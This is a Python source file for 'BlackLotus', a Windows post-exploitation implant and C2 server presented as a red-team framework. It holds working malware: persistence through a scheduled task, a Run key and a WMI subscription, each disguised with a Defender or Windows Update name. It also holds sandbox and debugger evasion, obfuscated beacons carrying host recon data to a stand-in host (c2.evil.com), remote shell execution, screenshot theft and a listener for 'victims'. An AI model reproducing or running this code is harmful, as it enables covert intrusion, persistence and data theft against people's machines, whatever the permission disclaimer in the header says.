#!/usr/bin/env python3
# BlackLotus.py - Living-Off-The-Land Red Team Post-Ex Framework
# EPO - Explicit Written Permission ONLY! 💀

import socket
import sys
import time
import random
import base64
import datetime
import os
import subprocess
import getpass
import platform
import json
import threading
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path
from urllib.request import urlopen, Request

kernel32 = ctypes.windll.kernel32

# ================= CONFIG =================
DEFAULT_C2_URL = "https://c2.evil.com:443/beacon"
SLEEP_MIN = 20
SLEEP_MAX = 120
JITTER = 0.65
XOR_KEY = 0xD4E7B9F1

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/129.0.2792.79"
]

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor(data: bytes) -> bytes:
    return bytes(b ^ (XOR_KEY & 0xFF) for b in data)

def fake_delay(min_sec=8, max_sec=25):
    time.sleep(random.uniform(min_sec, max_sec))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_sandbox():
    checks = [
        is_debugged(),
        len(os.listdir("C:\\")) < 6,
        "sandbox" in getpass.getuser().lower(),
        os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys")
    ]
    return any(checks)

def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

# ================= LOTL PERSISTENCE =================
def add_persistence():
    if platform.system() != "Windows" or not is_admin():
        return

    # Schtasks (SYSTEM context)
    task_cmd = (
        f'schtasks /create /tn "WindowsDefenderUpdate" /tr "{sys.executable} {__file__} beacon {DEFAULT_C2_URL}" '
        f'/sc minute /mo 15 /ru SYSTEM /f /rl HIGHEST'
    )
    subprocess.call(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Registry Run
    try:
        import winreg as reg
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "DefenderTelemetry", 0, reg.REG_SZ, f"{sys.executable} {__file__} beacon {DEFAULT_C2_URL}")
        reg.CloseKey(key)
    except:
        pass

    # WMI permanent event (stealthy)
    wmi_cmd = (
        'powershell -Command "'
        '$filter = New-CimInstance -ClassName __EventFilter -Namespace root/subscription '
        '-Property @{Name=\'WindowsUpdateFilter\';EventNameSpace=\'root/cimv2\';QueryLanguage=\'WQL\';Query=\'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_LocalTime\\"\'};'
        '$consumer = New-CimInstance -ClassName CommandLineEventConsumer -Namespace root/subscription '
        '-Property @{Name=\'WindowsUpdateConsumer\';CommandLineTemplate=\'' + sys.executable + ' ' + __file__ + ' beacon ' + DEFAULT_C2_URL + '\'}};'
        '$binding = New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root/subscription '
        '-Property @{Filter=$filter;Consumer=$consumer}"'
    )
    subprocess.call(wmi_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ================= BEACON & CONTROL =================
def beacon_loop(c2_url: str):
    backoff = SLEEP_MIN
    print(f"[{timestamp()}] BlackLotus launching → C2: {c2_url}")

    while True:
        try:
            fake_delay(5, 15)

            # Recon data
            info = {
                "time": timestamp(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "admin": is_admin(),
                "sandbox": is_sandbox(),
                "os": platform.system(),
                "local_ip": socket.gethostbyname(socket.gethostname())
            }
            payload = json.dumps(info)
            obfuscated = base64.b64encode(xor(payload.encode())).decode()

            # Send beacon via HTTPS POST
            req = Request(c2_url, data=obfuscated.encode(), headers={
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json'
            })
            with urlopen(req, timeout=20) as resp:
                task = resp.read().decode(errors='ignore').strip()

            if task:
                print(f"[{timestamp()}] Task received: {task}")
                handle_lotl_task(task, c2_url)

            # Sleep
            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            jittered = int(sleep_time * (1 + random.uniform(-JITTER, JITTER)))
            print(f"[{timestamp()}] Sleeping {jittered}s")
            time.sleep(jittered)

            backoff = SLEEP_MIN

        except Exception as e:
            print(f"[{timestamp()}] Error: {e}")
            backoff = min(backoff * 2, 7200)
            jittered = int(backoff * (1 + random.uniform(-JITTER, JITTER)))
            time.sleep(jittered)

def handle_lotl_task(task: str, c2_url: str):
    if task == "shell":
        cmd = input("LotL shell> ").strip()
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=45).decode(errors='ignore')
            send_result(out, c2_url)
        except Exception as e:
            send_result(str(e), c2_url)
    elif task == "screenshot":
        try:
            import pyautogui
            img = pyautogui.screenshot()
            img.save("tmp_screen.png")
            with open("tmp_screen.png", "rb") as f:
                data = base64.b64encode(f.read()).decode()
            send_result(data, c2_url)
            os.remove("tmp_screen.png")
        except:
            send_result("Screenshot failed", c2_url)
    elif task == "persist":
        add_persistence()
        send_result("Persistence added via LotL methods", c2_url)
    # Add more: upload, download, clipboard, etc.

def send_result(result: str, c2_url: str):
    obfuscated = base64.b64encode(xor(result.encode())).decode()
    req = Request(c2_url, data=obfuscated.encode(), headers={'User-Agent': random.choice(USER_AGENTS)})
    urlopen(req, timeout=10)

# ================= C2 LISTENER =================
def c2_listener(host: str, port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    print(f"[{timestamp()}] C2 listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        print(f"[{timestamp()}] New victim from {addr}")
        data = client.recv(32768).decode(errors='ignore')
        print(data)
        task = input(f"[{addr}] LotL Command> ").strip()
        client.send(task.encode())
        client.close()

# ================= MAIN =================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python BlackLotus.py c2 <host> <port>")
        print("  python BlackLotus.py beacon <c2_url>")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "c2":
        c2_listener(sys.argv[2], int(sys.argv[3]))
    elif mode == "beacon":
        c2_url = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_C2_URL
        add_persistence()
        beacon_loop(c2_url)
    else:
        print("Invalid mode")
        sys.exit(1)